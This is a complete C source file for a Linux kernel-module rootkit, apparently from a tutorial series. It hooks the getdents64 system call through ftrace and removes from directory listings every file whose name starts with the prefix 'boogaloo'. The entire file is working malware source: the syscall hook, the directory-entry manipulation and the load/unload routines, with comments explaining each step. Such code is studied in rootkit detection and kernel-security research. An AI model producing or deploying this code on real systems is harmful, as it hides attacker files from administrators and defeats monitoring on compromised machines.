#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>

#include "ftrace_helper.h"

#define PREFIX "boogaloo"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("Hiding files that start with a certain prefix");
MODULE_VERSION("0.02");


static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

/* This is our hooked function for sys_getdents64 */
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
    // int fd = regs->di;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    // int count = regs->dx;

    long error;

    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret)
    {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to PREFIX */
        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
        {
            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the crucial step: we add the length of the current directory to that of the 
             * previous one. This means that when the directory structure is looped over to print/search
             * the contents, the current directory is subsumed into that of whatever preceeds it. */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* If we end up here, then we didn't find PREFIX in current_dir->d_name 
             * We set previous_dir to the current_dir before moving on and incrementing
             * current_dir at the start of the loop */
            previous_dir = current_dir;
        }

        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;

}

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};

/* Module initialization function */
static int __init rootkit_init(void)
{
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
